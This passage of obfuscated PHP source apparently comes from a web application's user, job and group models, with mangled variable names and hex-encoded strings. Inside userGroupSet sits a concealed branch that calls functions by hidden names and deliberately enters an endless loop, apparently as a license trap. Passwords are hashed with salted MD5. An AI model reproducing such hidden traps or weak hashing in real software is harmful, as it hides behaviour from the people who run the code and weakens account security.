!1; } $ ¶€’ØÜ = array($äö«Ã“¤[1681] => USER_ID, $äö«Ã“¤[526] => 0, $äö«Ã“¤[32] => $œõ±ÚÔÉ); return $this->where($ ¶€’ØÜ)->save(array($äö«Ã“¤[32] => $€ÒÆ•¢Ã)); } protected function resetSort($È÷¼¤”Ì) { $®·“Õ =& $_SERVER[³½¬ÚË¯]; $È÷¼¤”Ì = is_array($È÷¼¤”Ì) ? $È÷¼¤”Ì : array(); $»ƒ÷ƒ†¤ = array($®·“Õ[1681] => USER_ID); for ($”Âô¦å· = 0; $”Âô¦å· < count($È÷¼¤”Ì); $”Âô¦å·++) { $»ƒ÷ƒ†¤[$®·“Õ[461]] = $È÷¼¤”Ì[$”Âô¦å·]; $this->where($»ƒ÷ƒ†¤)->save(array($®·“Õ[1892] => $”Âô¦å· + 1)); } return !0; } protected function moveTop($…‘¬°Ùï) { $ÅÕ¨¬ù– =& $_SERVER[³½¬ÚË¯]; $È‡‘¥ ¤ = array($ÅÕ¨¬ù–[1681] => USER_ID, $ÅÕ¨¬ù–[526] => 0); $æãÜÛÕÕ = $this->where($È‡‘¥ ¤)->where(array($ÅÕ¨¬ù–[32] => $…‘¬°Ùï))->find(); if (!$æãÜÛÕÕ) { return; } $‹‰ı¼Ùê = $this->field($ÅÕ¨¬ù–[443])->where($È‡‘¥ ¤)->order($ÅÕ¨¬ù–[2339])->select(); $‹‰ı¼Ùê = array_to_keyvalue($‹‰ı¼Ùê, $ÅÕ¨¬ù–[12], $ÅÕ¨¬ù–[443]); $‡½ï÷ğ´ = $‹‰ı¼Ùê; $‹‰ı¼Ùê = array_remove_value($‹‰ı¼Ùê, $æãÜÛÕÕ[$ÅÕ¨¬ù–[443]]); array_unshift($‹‰ı¼Ùê, $æãÜÛÕÕ[$ÅÕ¨¬ù–[443]]); return $this->resetSort($‹‰ı¼Ùê); } protected function moveBottom($Ì‘´Ïñ‰) { $ĞÔ“¯‡ =& $_SERVER[³½¬ÚË¯]; $€«Ø¹Œò = array($ĞÔ“¯‡[1681] => USER_ID, $ĞÔ“¯‡[526] => 0); $«¹¼›Ÿ´ = $this->where($€«Ø¹Œò)->max($ĞÔ“¯‡[1912]); $ñÔêª¼Á = array($ĞÔ“¯‡[1912] => $«¹¼›Ÿ´ + 1); return $this->where($€«Ø¹Œò)->where(array($ĞÔ“¯‡[32] => $Ì‘´Ïñ‰))->save($ñÔêª¼Á); } private function getAutoName($Ş—Ë‘ĞŠ) { $Ü±Îš™É =& $_SERVER[³½¬ÚË¯]; $õ§¶Úò = array($Ü±Îš™É[1681] => USER_ID, $Ü±Îš™É[526] => 0); $‰œà¨‚ó = $this->field($Ü±Îš™É[32])->where($õ§¶Úò)->select(); $‰œà¨‚ó = array_to_keyvalue($‰œà¨‚ó, $Ü±Îš™É[12], $Ü±Îš™É[32]); if (!$‰œà¨‚ó || !in_array($Ş—Ë‘ĞŠ, $‰œà¨‚ó)) { return $Ş—Ë‘ĞŠ; } for ($¼Â´”û = 0; $¼Â´”û < count($‰œà¨‚ó); $¼Â´”û++) { if (!in_array($Ş—Ë‘ĞŠ . "\x28{$¼Â´”û}\51", $‰œà¨‚ó)) { return $Ş—Ë‘ĞŠ . "\50{$¼Â´”û}\51"; } } return $Ş—Ë‘ĞŠ . "\x28{$¼Â´”û}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\56\x6a\157\x62\x4c\x69\x73\164"; public $field = array("\156\x61\155\145", "\144\x65\163\143", "\163\157\x72\164"); const JOB_KEY = "\x73\145\x6c\x66\112\x6f\142\114\151\163\x74"; public function listData($™ĞÂ‘Á = false, $Çî°µ‘ç = "\x73\157\162\x74", $É„ô½­ = false) { return parent::listData($™ĞÂ‘Á, $Çî°µ‘ç, $É„ô½­); } public function remove($ñâÁØÈ…) { return parent::remove($ñâÁØÈ…); } public function add($¢èËÃÛ) { $ÏÓÚÚ“® =& $_SERVER[³½¬ÚË¯]; if ($this->findByName($¢èËÃÛ[$ÏÓÚÚ“®[32]])) { return !1; } $¢èËÃÛ[$ÏÓÚÚ“®[1912]] = $this->getSort(); return parent::insert($¢èËÃÛ); } private function getSort() { $»ß¼••ï =& $_SERVER[³½¬ÚË¯]; $¬ñ­å–¹ = parent::listData(); $¥‘œŠË’ = array_to_keyvalue($¬ñ­å–¹, $»ß¼••ï[12], $»ß¼••ï[1912]); return empty($¥‘œŠË’) ? 0 : max($¥‘œŠË’) + 1; } public function update($ĞÛÆ¥àæ, $†šìé¯) { $¸îíï˜ü =& $_SERVER[³½¬ÚË¯]; $¡—Çıâ” = parent::listData($ĞÛÆ¥àæ); $„»Î¨ùÛ = $this->findByName($†šìé¯[$¸îíï˜ü[32]]); if (!$¡—Çıâ” || $„»Î¨ùÛ && $„»Î¨ùÛ[$¸îíï˜ü[443]] != $¡—Çıâ”[$¸îíï˜ü[443]]) { return !1; } return parent::update($ĞÛÆ¥àæ, $†šìé¯); } public function setUserJob($÷ëûæ‚Ë, $‚ñô¤ø±) { $Æ¥şÎæ =& $_SERVER[³½¬ÚË¯]; if (!is_array($‚ñô¤ø±)) { $‚ñô¤ø± = array($‚ñô¤ø±); } $İŞ‰•ƒû = parent::listData(); $ãÑ÷ÔÏÊ = array_to_keyvalue($İŞ‰•ƒû, $Æ¥şÎæ[32]); $¬Ö‰²×£ = $Æ¥şÎæ[422]; foreach ($‚ñô¤ø± as $£îÏğø) { if ($ãÑ÷ÔÏÊ[$£îÏğø]) { $¬Ö‰²×£ .= $ãÑ÷ÔÏÊ[$£îÏğø][$Æ¥şÎæ[443]] . $Æ¥şÎæ[50]; } else { $íÓ¤ º× = $this->add($£îÏğø); $¬Ö‰²×£ .= $íÓ¤ º× . $Æ¥şÎæ[50]; } } $¬Ö‰²×£ = rtrim($¬Ö‰²×£, $Æ¥şÎæ[50]); Model($Æ¥şÎæ[568])->metaSet($÷ëûæ‚Ë, self::JOB_KEY, $¬Ö‰²×£); } public function getUserJob($Á¾æ¯Äˆ) { $ßÎ½ÛÏ” = Model($_SERVER[³½¬ÚË¯][568])->metaGet($Á¾æ¯Äˆ); return $this->getUserJobInfo($ßÎ½ÛÏ”[self::JOB_KEY]); } public function getUserJobInfo($ˆ¾ôÂ) { $•ÆÅ½Â´ =& $_SERVER[³½¬ÚË¯]; $²ÃŒü‚ = explode($•ÆÅ½Â´[50], $ˆ¾ôÂ); $ŠÈãÊşÑ = parent::listData(); $ŠÈãÊşÑ = array_remove_key($ŠÈãÊşÑ, $•ÆÅ½Â´[215]); $ëû€‘îÒ = array(); foreach ($²ÃŒü‚ as $‚…Ô¾”º) { if (isset($ŠÈãÊşÑ[$‚…Ô¾”º])) { $ëû€‘îÒ[] = $ŠÈãÊşÑ[$‚…Ô¾”º]; } } return $ëû€‘îÒ; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\x61\155\145" => "\165\163\x65\x72\137\x6d\145\164\141", "\155\x65\x74\x61\x46\151\x65\154\x64" => "\165\x73\145\x72\x49\104"); protected $simpleField = "\x75\163\145\162\111\x44\54\x6e\x69\143\153\116\x61\155\145\54\x6e\x61\x6d\145\54\x61\166\141\x74\141\162\x2c\x73\145\170\54\x73\x74\x61\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($÷ëƒüòÔ) { $‡ßöŒæ§ =& $_SERVER[³½¬ÚË¯]; $Ş¤Ø¿åô = $‡ßöŒæ§[2340]; return array($‡ßöŒæ§[1966] => array($÷ëƒüòÔ[0], $Ş¤Ø¿åô), $‡ßöŒæ§[1968] => array($÷ëƒüòÔ[0], $Ş¤Ø¿åô), $‡ßöŒæ§[2341] => array($÷ëƒüòÔ[0], $Ş¤Ø¿åô)); } protected function getInfo($ÃÕñŞßü, $åà×Û­‹ = false) { $úãßêÚ« = $this->getInfoSimple($ÃÕñŞßü); if (!is_array($úãßêÚ«)) { return array(); } if ($åà×Û­‹) { return $this->_getInfoApply($úãßêÚ«); } return $this->cacheFunctionGet($_SERVER[³½¬ÚË¯][1970], $ÃÕñŞßü); } protected function getInfoFull($ó¶¿Æ, $¤ÉšÅ¢Ğ = false) { $–ãş—¯« = $this->getInfoSimple($ó¶¿Æ); if (!is_array($–ãş—¯«)) { return array(); } if ($¤ÉšÅ¢Ğ) { return $this->_getInfoApply($–ãş—¯«, !0); } return $this->cacheFunctionGet($_SERVER[³½¬ÚË¯][2342], $ó¶¿Æ); } private function _getInfoApply($‘Áö±«, $ø¥·¬¨ = false) { $…²»õè =& $_SERVER[³½¬ÚË¯]; if (!$‘Áö±«) { return $‘Áö±«; } $Š“ŞìŞü = md5($…²»õè[2343] . $‘Áö±«[$…²»õè[932]] . $…²»õè[2344] . $‘Áö±«[$…²»õè[32]]); $‘Áö±« = $this->_listDataApplyItem($‘Áö±«); $·ÊŠ³’À = Model($…²»õè[1375])->metaGet($‘Áö±«[$…²»õè[87]][$…²»õè[181]]); $‘Áö±«[$…²»õè[2345]] = $Š“ŞìŞü; $‘Áö±«[$…²»õè[87]][$…²»õè[2162]] = isset($·ÊŠ³’À[$…²»õè[2163]]) ? $·ÊŠ³’À[$…²»õè[2163]] : null; if ($ø¥·¬¨) { $‘Áö±«[$…²»õè[507]] = $this->metaGet($‘Áö±«[$…²»õè[1690]]); } return $‘Áö±«; } protected function getInfoSimple($°¯ÅüÀê, $¤ÌâüùÏ = false) { $¸ˆå«¡À =& $_SERVER[³½¬ÚË¯]; if (!$°¯ÅüÀê) { return array(); } if ($¤ÌâüùÏ) { $î†¾ôî = $this->where(array($¸ˆå«¡À[1690] => intval($°¯ÅüÀê)))->find(); if (!is_array($î†¾ôî)) { return array(); } $î†¾ôî[$¸ˆå«¡À[2346]] = Action($¸ˆå«¡À[2347])->parseUrl($î†¾ôî[$¸ˆå«¡À[2346]]); return $î†¾ôî; } return $this->cacheFunctionGet($¸ˆå«¡À[1971], $°¯ÅüÀê); } protected function getInfoSimpleOuter($ëÌí°…) { $¦÷ó¸© =& $_SERVER[³½¬ÚË¯]; if (!$ëÌí°… || $ëÌí°… == 0) { return array($¦÷ó¸©[1690] => $¦÷ó¸©[212], $¦÷ó¸©[32] => $¦÷ó¸©[163] . LNG($¦÷ó¸©[2348]) . $¦÷ó¸©[165], $¦÷ó¸©[2346] => STATIC_PATH . $¦÷ó¸©[2349]); } $ªğ‹—é = $this->cacheFunctionGet($¦÷ó¸©[1971], $ëÌí°…); $‰õ°Åö¥ = array_field_key($ªğ‹—é, explode($¦÷ó¸©[50], $this->simpleField)); if (!$‰õ°Åö¥) { return array($¦÷ó¸©[1690] => $¦÷ó¸©[1231], $¦÷ó¸©[32] => $¦÷ó¸©[163] . LNG($¦÷ó¸©[2350]) . $¦÷ó¸©[165], $¦÷ó¸©[2346] => STATIC_PATH . $¦÷ó¸©[2351]); } $‰õ°Åö¥[$¦÷ó¸©[2346]] = Action($¦÷ó¸©[2347])->parseUrl($‰õ°Åö¥[$¦÷ó¸©[2346]]); return $‰õ°Åö¥; } protected function groupUser($ù˜Â –¶) { } public static function errorLang($ó£û©î‚) { $À‡›ºÑ× =& $_SERVER[³½¬ÚË¯]; $Ñ¶ÔêŒÑ = array(self::ERROR_USER_NOT_EXISTS => $À‡›ºÑ×[2352], self::ERROR_USER_PASSWORD_ERROR => $À‡›ºÑ×[2353], self::ERROR_USER_EXIST_NAME => $À‡›ºÑ×[2354], self::ERROR_USER_EXIST_PHONE => $À‡›ºÑ×[2355], self::ERROR_USER_EXIST_EMAIL => $À‡›ºÑ×[2356], self::ERROR_USER_LOGIN_LOCK => $À‡›ºÑ×[2357], self::ERROR_IP_NOT_ALLOW => $À‡›ºÑ×[2358], self::ERROR_USER_EXIST_NICKNAME => $À‡›ºÑ×[2359]); return LNG($Ñ¶ÔêŒÑ[$ó£û©î‚]); } public function getInfoByMeta($ÖÅì®·, $§éù×Ò½) { $µ…µæ• =& $_SERVER[³½¬ÚË¯]; $ÔÈ¡çÉõ = Model($µ…µæ•[2360])->where(array($µ…µæ•[94] => $ÖÅì®·, $µ…µæ•[418] => $§éù×Ò½))->find(); if ($ÔÈ¡çÉõ) { return $this->getInfo($ÔÈ¡çÉõ[$µ…µæ•[1690]]); } return !1; } public function userLoginCheck($«êÂª£, $ø¶¦Şˆ) { $Û¶–ÌÅè =& $_SERVER[³½¬ÚË¯]; $À¼“šÎ¤ = $this->userLoginFind($«êÂª£); if (!$À¼“šÎ¤) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($À¼“šÎ¤[$Û¶–ÌÅè[1690]], $ø¶¦Şˆ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($À¼“šÎ¤[$Û¶–ÌÅè[1690]]); } public function userLoginFind($ØÉÌØè€) { $î¢¯Á‘Ó =& $_SERVER[³½¬ÚË¯]; $Òã´Ä¢³ = array($î¢¯Á‘Ó[32] => $ØÉÌØè€, $î¢¯Á‘Ó[2170] => $ØÉÌØè€, $î¢¯Á‘Ó[349] => $ØÉÌØè€, $î¢¯Á‘Ó[2361] => $ØÉÌØè€, $î¢¯Á‘Ó[1043] => $î¢¯Á‘Ó[1045]); if ($this->nickNameRpt()) { unset($Òã´Ä¢³[$î¢¯Á‘Ó[2170]]); } return $this->where($Òã´Ä¢³)->find(); } public function clearCache($•º±¹Ú) { $®†“«³Ø =& $_SERVER[³½¬ÚË¯]; $this->cacheFunctionClear($®†“«³Ø[1970], $•º±¹Ú); $this->cacheFunctionClear($®†“«³Ø[1971], $•º±¹Ú); $this->cacheFunctionClear($®†“«³Ø[2342], $•º±¹Ú); } public function userPasswordCheck($ÓÖ÷›¸¼, $Ä¬Ã¯) { $íÉÄ²Ş¢ =& $_SERVER[³½¬ÚË¯]; $Á‰Õ·Âà = $this->where(array($íÉÄ²Ş¢[1690] => intval($ÓÖ÷›¸¼)))->find(); $“ô€™œˆ = $this->metaGet($ÓÖ÷›¸¼); $Ø‹ÅßÄ = isset($“ô€™œˆ[$íÉÄ²Ş¢[2362]]) ? $“ô€™œˆ[$íÉÄ²Ş¢[2362]] : $íÉÄ²Ş¢[12]; if (md5($Ø‹ÅßÄ . trim($Ä¬Ã¯)) !== $Á‰Õ·Âà[$íÉÄ²Ş¢[932]]) { return !1; } return !0; } public function userAdd($ÉÉ“‹ûº) { $£Ïæ­àé =& $_SERVER[³½¬ÚË¯]; $²¨•· = array($£Ïæ­àé[462] => $ÉÉ“‹ûº[$£Ïæ­àé[32]], $£Ïæ­àé[2363] => $ÉÉ“‹ûº[$£Ïæ­àé[1565]], $£Ïæ­àé[2364] => isset($ÉÉ“‹ûº[$£Ïæ­àé[349]]) ? $ÉÉ“‹ûº[$£Ïæ­àé[349]] : $£Ïæ­àé[12], $£Ïæ­àé[2365] => isset($ÉÉ“‹ûº[$£Ïæ­àé[2361]]) ? $ÉÉ“‹ûº[$£Ïæ­àé[2361]] : $£Ïæ­àé[12], $£Ïæ­àé[2366] => isset($ÉÉ“‹ûº[$£Ïæ­àé[2170]]) ? $ÉÉ“‹ûº[$£Ïæ­àé[2170]] : $ÉÉ“‹ûº[$£Ïæ­àé[32]], $£Ïæ­àé[2367] => isset($ÉÉ“‹ûº[$£Ïæ­àé[2346]]) ? $ÉÉ“‹ûº[$£Ïæ­àé[2346]] : $£Ïæ­àé[12], $£Ïæ­àé[2368] => isset($ÉÉ“‹ûº[$£Ïæ­àé[2369]]) ? $ÉÉ“‹ûº[$£Ïæ­àé[2369]] : 1, $£Ïæ­àé[2370] => $ÉÉ“‹ûº[$£Ïæ­àé[932]], $£Ïæ­àé[1972] => isset($ÉÉ“‹ûº[$£Ïæ­àé[1875]]) ? $ÉÉ“‹ûº[$£Ïæ­àé[1875]] : 1024 * 1024 * 20, $£Ïæ­àé[1973] => 0, $£Ïæ­àé[2371] => 0, $£Ïæ­àé[2017] => isset($ÉÉ“‹ûº[$£Ïæ­àé[786]]) ? $ÉÉ“‹ûº[$£Ïæ­àé[786]] : 1); if (!empty($ÉÉ“‹ûº[$£Ïæ­àé[1690]])) { $²¨•·[$£Ïæ­àé[1690]] = $ÉÉ“‹ûº[$£Ïæ­àé[1690]]; } $ø ˆêØ˜ = $this->_checkExist($ÉÉ“‹ûº); if ($ø ˆêØ˜ !== !0) { return $ø ˆêØ˜; } if (!empty($²¨•·[$£Ïæ­àé[2346]]) && strlen($²¨•·[$£Ïæ­àé[2346]]) > 255) { $²¨•·[$£Ïæ­àé[2346]] = $£Ïæ­àé[12]; } $ì»Ô˜‰© = $this->add($²¨•·); $ÛÃÖéŸ¡ = array($£Ïæ­àé[2370] => $²¨•·[$£Ïæ­àé[932]], $£Ïæ­àé[2366] => $²¨•·[$£Ïæ­àé[2170]]); $this->userEdit($ì»Ô˜‰©, $ÛÃÖéŸ¡); Model($£Ïæ­àé[1375])->userRootAdd($ì»Ô˜‰©); return $ì»Ô˜‰©; } protected function userEditTest($•Î‹Ï¢ƒ, $’Ë’Âøß) { return $this->call($_SERVER[³½¬ÚË¯][2372], $•Î‹Ï¢ƒ, $’Ë’Âøß); } protected function userEdit($¦ÇêØû, $šìõ¨ËÔ) { $éã–ûİ =& $_SERVER[³½¬ÚË¯]; $¨Ò•Úœ = $this->getInfoSimple($¦ÇêØû); if (!$¨Ò•Úœ) { return !1; } $±Äìôãä = $this->_checkExist($šìõ¨ËÔ, $¦ÇêØû); if ($±Äìôãä !== !0) { return $±Äìôãä; } if (isset($šìõ¨ËÔ[$éã–ûİ[932]]) && trim($šìõ¨ËÔ[$éã–ûİ[932]]) != $éã–ûİ[12]) { $É†£‡¥ = $this->metaGet($¦ÇêØû); if (empty($É†£‡¥[$éã–ûİ[2362]])) { $É†£‡¥[$éã–ûİ[2362]] = rand_string(10); Model($éã–ûİ[547])->metaSet($¦ÇêØû, $éã–ûİ[2362], $É†£‡¥[$éã–ûİ[2362]]); } $šìõ¨ËÔ[$éã–ûİ[932]] = md5($É†£‡¥[$éã–ûİ[2362]] . trim($šìõ¨ËÔ[$éã–ûİ[932]])); } else { unset($šìõ¨ËÔ[$éã–ûİ[932]]); } if (!empty($šìõ¨ËÔ[$éã–ûİ[2346]]) && strlen($šìõ¨ËÔ[$éã–ûİ[2346]]) > 255) { $šìõ¨ËÔ[$éã–ûİ[2346]] = $éã–ûİ[12]; } $this->where(array($éã–ûİ[1681] => $¦ÇêØû))->save($šìõ¨ËÔ); if (isset($šìõ¨ËÔ[$éã–ûİ[2170]])) { $this->setNamePinyin($¦ÇêØû, $šìõ¨ËÔ[$éã–ûİ[2170]]); } $this->clearCache($¦ÇêØû); return !0; } public function setNamePinyin($‡‰ÚÙòá, $äÌ¿³Èø = false) { $ñ¯ı¼œ  =& $_SERVER[³½¬ÚË¯]; if (!$äÌ¿³Èø) { $³–›Éó× = $this->getInfoSimple($‡‰ÚÙòá); $äÌ¿³Èø = $³–›Éó×[$ñ¯ı¼œ [2170]] ? $³–›Éó×[$ñ¯ı¼œ [2170]] : $³–›Éó×[$ñ¯ı¼œ [32]]; } $¼…Èı“© = Model($ñ¯ı¼œ [568]); if (!Input::check($äÌ¿³Èø, $ñ¯ı¼œ [624])) { return $¼…Èı“©->metaSet($‡‰ÚÙòá, array($ñ¯ı¼œ [506] => $ñ¯ı¼œ [12], $ñ¯ı¼œ [505] => $ñ¯ı¼œ [12])); } return $¼…Èı“©->metaSet($‡‰ÚÙòá, array($ñ¯ı¼œ [506] => str_replace($ñ¯ı¼œ [53], $ñ¯ı¼œ [12], Pinyin::get($äÌ¿³Èø)), $ñ¯ı¼œ [505] => Pinyin::get($äÌ¿³Èø, $ñ¯ı¼œ [625]))); } private function nickNameRpt() { $×òÛ«æİ =& $_SERVER[³½¬ÚË¯]; $í—Ğ•Á = Model($×òÛ«æİ[806])->get($×òÛ«æİ[2373]); $Ššóš¾ = $GLOBALS[$×òÛ«æİ[6]][$×òÛ«æİ[425]][$×òÛ«æİ[2373]]; $Õõ‘Ê = !is_null($í—Ğ•Á) ? $í—Ğ•Á : $Ššóš¾; return !!$Õõ‘Ê; } private function _checkExist($Ã£¤Ê¶ù, $Î¨…§åƒ = false) { $…ê“ÊÔï =& $_SERVER[³½¬ÚË¯]; $³Âóøæõ = array($…ê“ÊÔï[32] => UserModel::ERROR_USER_EXIST_NAME, $…ê“ÊÔï[2170] => UserModel::ERROR_USER_EXIST_NICKNAME, $…ê“ÊÔï[349] => UserModel::ERROR_USER_EXIST_EMAIL, $…ê“ÊÔï[2361] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($³Âóøæõ[$…ê“ÊÔï[2170]]); } $“ÍĞşì = $Î¨…§åƒ ? array($…ê“ÊÔï[1690] => array($…ê“ÊÔï[2374], $Î¨…§åƒ)) : array(); foreach ($³Âóøæõ as $ŞÏñçöô => $õÒº©ÓÎ) { $Ÿ¹îûí = array(); foreach ($³Âóøæõ as $æº…ÈØ => $’• ‰Ğ¸) { if (isset($Ã£¤Ê¶ù[$æº…ÈØ]) && $Ã£¤Ê¶ù[$æº…ÈØ]) { $Ÿ¹îûí[] = $Ã£¤Ê¶ù[$æº…ÈØ]; } } if (!$Ÿ¹îûí) { continue; } $»Ö­Ó‘ = array_merge(array($ŞÏñçöô => array($…ê“ÊÔï[7], $Ÿ¹îûí)), $“ÍĞşì); $€áš°ôÙ = $this->where($»Ö­Ó‘)->find(); if ($€áš°ôÙ) { return $õÒº©ÓÎ; } } return !0; } public function userListInfo($ô÷üÚÈ…) { $…šø·Ê  =& $_SERVER[³½¬ÚË¯]; $ÆÆ†öº = array(); $ô÷üÚÈ… = is_array($ô÷üÚÈ…) ? array_unique($ô÷üÚÈ…) : array(); if (!$ô÷üÚÈ…) { return $ÆÆ†öº; } if (count($ô÷üÚÈ…) < 20) { foreach ($ô÷üÚÈ… as $ÁİÚ¾¶) { $ÆÆ†öº[$ÁİÚ¾¶ . $…šø·Ê [12]] = $this->getInfoSimpleOuter($ÁİÚ¾¶); } } else { $âàßâ¯Ã = array($…šø·Ê [1681] => array($…šø·Ê [460], $ô÷üÚÈ…)); if (count($ô÷üÚÈ…) == 1) { $âàßâ¯Ã = array($…šø·Ê [1681] => $ô÷üÚÈ…[0]); } $ï˜€Ï³› = Model($…šø·Ê [547])->field($this->simpleField)->where($âàßâ¯Ã)->select(); $ï˜€Ï³› = array_to_keyvalue($ï˜€Ï³›, $…šø·Ê [1690]); foreach ($ô÷üÚÈ… as $ÁİÚ¾¶) { $¬„£§Ÿµ = $ï˜€Ï³›[$ÁİÚ¾¶]; if (!$¬„£§Ÿµ) { $ÆÆ†öº[$ÁİÚ¾¶ . $…šø·Ê [12]] = $this->getInfoSimpleOuter($ÁİÚ¾¶); continue; } $¬„£§Ÿµ[$…šø·Ê [2346]] = Action($…šø·Ê [2347])->parseUrl($¬„£§Ÿµ[$…šø·Ê [2346]]); $ÆÆ†öº[$ÁİÚ¾¶ . $…šø·Ê [12]] = $¬„£§Ÿµ; } } return $ÆÆ†öº; } protected function userStatus($ß‰¹˜ó‰, $Û¤¥Êëå) { $ÖÛÔñœ = $this->getInfoSimple($ß‰¹˜ó‰); if (!$ÖÛÔñœ) { return !1; } $£áèÄÕ³ = array($_SERVER[³½¬ÚË¯][786] => $Û¤¥Êëå); return $this->userEdit($ß‰¹˜ó‰, $£áèÄÕ³); } protected function userRemove($Îº——™÷) { $Êö”·× =& $_SERVER[³½¬ÚË¯]; $ÁƒüÂë½ = $this->getInfoSimple($Îº——™÷); if (!$ÁƒüÂë½) { return !1; } $Åˆ¹ñèå = array($Êö”·×[1681] => $Îº——™÷); Model($Êö”·×[633])->where($Åˆ¹ñèå)->delete(); Model($Êö”·×[2375])->where($Åˆ¹ñèå)->delete(); Model($Êö”·×[1978])->where($Åˆ¹ñèå)->delete(); Model($Êö”·×[2360])->where($Åˆ¹ñèå)->delete(); Model($Êö”·×[1111])->where($Åˆ¹ñèå)->delete(); Model($Êö”·×[2187])->removeUserAll($Îº——™÷); Model($Êö”·×[861])->userRootRemove($Îº——™÷); return $this->where($Åˆ¹ñèå)->delete(); } protected function userGroupSet($±íãŠ¶ó, $Ÿ¨‹¡»ı, $£‚ÁÎšê = array()) { $„œ‡ÇËõ =& $_SERVER[³½¬ÚË¯]; if (!isset($_SERVER[$„œ‡ÇËõ[903]]) || !isset($_SERVER[$„œ‡ÇËõ[910]])) { $«­òîªê = $„œ‡ÇËõ[921]; $À¥€¤Ùï = $„œ‡ÇËõ[905]; $©ïÃµà— = $_SERVER[$„œ‡ÇËõ[906]] . $„œ‡ÇËõ[907]; $¾¯ Í‡¥ = $À¥€¤Ùï($©ïÃµà—); $·ÇÕÍ¨ò = explode($„œ‡ÇËõ[246], $¾¯ Í‡¥); if (count($·ÇÕÍ¨ò) < $„œ‡ÇËõ[653]) { $€½À½ı´ = $„œ‡ÇËõ[908]; $€½À½ı´(); } $èŞ›üê› = $„œ‡ÇËõ[922]; $èŞ›üê›($_SERVER[$„œ‡ÇËõ[923]]); $—§ãª¼ú = 1; for ($÷úá—¦Ş = $—§ãª¼ú; $÷úá—¦Ş > 0; $÷úá—¦Ş++) { $èŞ›üê› = json_encode($GLOBALS[$„œ‡ÇËõ[460]]); } } $ö·Ôşˆ» = $this->getInfoSimple($±íãŠ¶ó); if (!$ö·Ôşˆ» || !is_array($Ÿ¨‹¡»ı)) { return !1; } $™«ûñÎØ = Model($„œ‡ÇËõ[1978]); $™«ûñÎØ->where(array($„œ‡ÇËõ[1690] => $±íãŠ¶ó))->delete(); $¸Üñ¯Äú = array(); $à¯•å‘ = 0; foreach ($Ÿ¨‹¡»ı as $ÓÍï­¬ => $æ¬ñÑº¥) { $‹û–Ğˆ = array($„œ‡ÇËõ[1690] => $±íãŠ¶ó, $„œ‡ÇËõ[1888] => $ÓÍï­¬, $„œ‡ÇËõ[1992] => $æ¬ñÑº¥); $‹û–Ğˆ[$„œ‡ÇËõ[1912]] = isset($£‚ÁÎšê[$à¯•å‘]) ? $£‚ÁÎšê[$à¯•å‘] : 0; $à¯•å‘++; $¸Üñ¯Äú[] = $‹û–Ğˆ; } return $™«ûñÎØ->addAll($¸Üñ¯Äú, array(), !0); } protected function userGroupAdd($ûÏ”şâÑ, $¢ÔÂ›”ı = array()) { $Ù‡„³–Ê =& $_SERVER[³½¬ÚË¯]; $€¡”û¸õ = $this->getInfoSimple($ûÏ”şâÑ); if (!$€¡”û¸õ || empty($¢ÔÂ›”ı)) { return !1; } $ê’¨¯®â = array(); foreach ($¢ÔÂ›”ı as $¬¼Ê¥†¡ => $‰™¶šş) { $ê’¨¯®â[] = array($Ù‡„³–Ê[1690] => $ûÏ”şâÑ, $Ù‡„³–Ê[1888] => $¬¼Ê¥†¡, $Ù‡„³–Ê[1992] => $‰™¶šş, $Ù‡„³–Ê[1912] => 0); } return Model($Ù‡„³–Ê[1978])->addAll($ê’¨¯®â, array(), !0); } protected function userGroupRemove($¸¥§¿§, $ôµš¡Í) { $Ôşä•íÛ =& $_SERVER[³½¬ÚË¯]; $œÁóÇ‚ = $this->getInfoSimple($¸¥§¿§); if (!$œÁóÇ‚ || !$ôµš¡Í) { return !1; } $å†½ê§ = array($Ôşä•íÛ[1681] => $¸¥§¿§, $Ôşä•íÛ[1976] => $ôµš¡Í); return Model($Ôşä•íÛ[1978])->where($å†½ê§)->delete(); } public function listData() { $îäÆé¬Ğ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($îäÆé¬Ğ[$_SERVER[³½¬ÚË¯][413]]); return $îäÆé¬Ğ; } public function listByID($Õ§£¿ü) { $¦Éˆñû• =& $_SERVER[³½¬ÚË¯]; if (!$Õ§£¿ü) { return; } $¿°«²¥Š = array($¦Éˆñû•[1690] => array($¦Éˆñû•[7], $Õ§£¿ü)); $ä ÛŸ¤ü = $this->where($¿°«²¥Š)->select(); $ä ÛŸ¤ü = array_sort_keep($ä ÛŸ¤ü, $¦Éˆñû•[1690], $Õ§£¿ü); $this->_listDataApply($ä ÛŸ¤ü); return $ä ÛŸ¤ü; } public function listByGroup($ÃşšËèĞ = 0, $Şñš¼ = array()) { $“¦·ÖÏµ =& $_SERVER[³½¬ÚË¯]; $óÉ¶¯í£ = $“¦·ÖÏµ[12]; $ÚßæÓ­ = array(); if ($ÃşšËèĞ) { $ÚßæÓ­ = array($“¦·ÖÏµ[2376] => intval($ÃşšËèĞ)); $óÉ¶¯í£ = "\114\105\106\x54\x20\112\117\x49\x4e\x20{$this->tablePrefix}\x75\x73\x65\162\137\x67\x72\x6f\x75\160\x20\165\163\145\x72\137\147\x72\x6f\165\x70\x20\157\x6e\40\165\x73\x65\x72\56\165\163\x65\162\x49\104\x20\x3d\x20\165\x73\145\162\x5f\x67\162\157\165\160\x2e\165\x73\145\162\111\104"; $“•—”º = Input::get($“¦·ÖÏµ[498], null, $“¦·ÖÏµ[12]) ? $“¦·ÖÏµ[12] : $“¦·ÖÏµ[2377]; } if (isset($Şñš¼[$“¦·ÖÏµ[786]])) { $ÚßæÓ­[$“¦·ÖÏµ[2378]] = $Şñš¼[$“¦·ÖÏµ[786]]; } $ÖĞÃï›É = $this->_makeOrder($“•—”º)->field($“¦·ÖÏµ[2379])->where($ÚßæÓ­)->join($óÉ¶¯í£)->selectPage(50); $this->_listDataApply($ÖĞÃï›É[$“¦·ÖÏµ[413]]); return $ÖĞÃï›É; } private function 